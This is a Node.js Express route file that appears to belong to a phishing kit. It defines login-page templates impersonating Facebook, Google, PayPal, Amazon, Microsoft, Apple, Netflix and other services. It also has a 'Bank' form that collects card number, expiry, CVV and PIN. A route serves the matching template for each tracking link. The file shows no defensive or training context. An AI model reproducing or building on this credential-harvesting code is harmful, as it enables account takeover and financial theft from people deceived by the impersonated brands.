const express = require('express');
const router = express.Router();
const db = require('../db');

const T = {
  facebook:  {color:'#1877f2',bg:'#f0f2f5',logo:'📘',title:'Facebook',fields:['email','password'],btn:'Log In',dark:false},
  google:    {color:'#4285f4',bg:'#ffffff',logo:'🔍',title:'Google',fields:['email'],btn:'Next',dark:false},
  instagram: {color:'#e1306c',bg:'#fafafa',logo:'📷',title:'Instagram',fields:['username','password'],btn:'Log In',dark:false},
  twitter:   {color:'#1da1f2',bg:'#f5f8fa',logo:'🐦',title:'Twitter',fields:['email','password'],btn:'Log in',dark:false},
  linkedin:  {color:'#0a66c2',bg:'#f3f2ef',logo:'💼',title:'LinkedIn',fields:['email','password'],btn:'Sign in',dark:false},
  netflix:   {color:'#e50914',bg:'#141414',logo:'🎬',title:'Netflix',fields:['email','password'],btn:'Sign In',dark:true},
  bank:      {color:'#0f2027',bg:'#e8f0fe',logo:'🏦',title:'Bank',fields:['card','expiry','cvv','pin'],btn:'Verify',dark:false},
  paypal:    {color:'#003087',bg:'#f5f7fa',logo:'💰',title:'PayPal',fields:['email','password'],btn:'Log In',dark:false},
  amazon:    {color:'#ff9900',bg:'#eaeded',logo:'📦',title:'Amazon',fields:['email','password'],btn:'Sign-In',dark:false},
  microsoft: {color:'#0078d4',bg:'#f3f3f3',logo:'🪟',title:'Microsoft',fields:['email'],btn:'Next',dark:false},
  apple:     {color:'#000',bg:'#fbfbfd',logo:'🍎',title:'Apple ID',fields:['email','password'],btn:'Sign In',dark:false},
  spotify:   {color:'#1db954',bg:'#191414',logo:'🎵',title:'Spotify',fields:['email','password'],btn:'Log In',dark:true},
  discord:   {color:'#5865f2',bg:'#36393f',logo:'🎮',title:'Discord',fields:['email','password'],btn:'Login',dark:true},
  tiktok:    {color:'#ff0050',bg:'#f5f5f5',logo:'🎵',title:'TikTok',fields:['email','password'],btn:'Log in',dark:false},
  custom:    {color:'#3b82f6',bg:'#0f172a',logo:'📨',title:'Message',fields:['email','password'],btn:'Submit',dark:true},
};

router.get('/list', (req, res) => { res.json(Object.keys(T).map(k=>({id:k,title:T[k].title,logo:T[k].logo}))); });

router.get('/:code', (req, res) => {
  const link = db.links.read().find(l=>l.trackingCode===req.params.code);
  const tpl = T[link?.inboxAction==='form'?link.category?.toLowerCase():'custom'] || T.custom;
  tpl.trackingCode = req.params.code;
  res.json(tpl);
});

module.exports = router;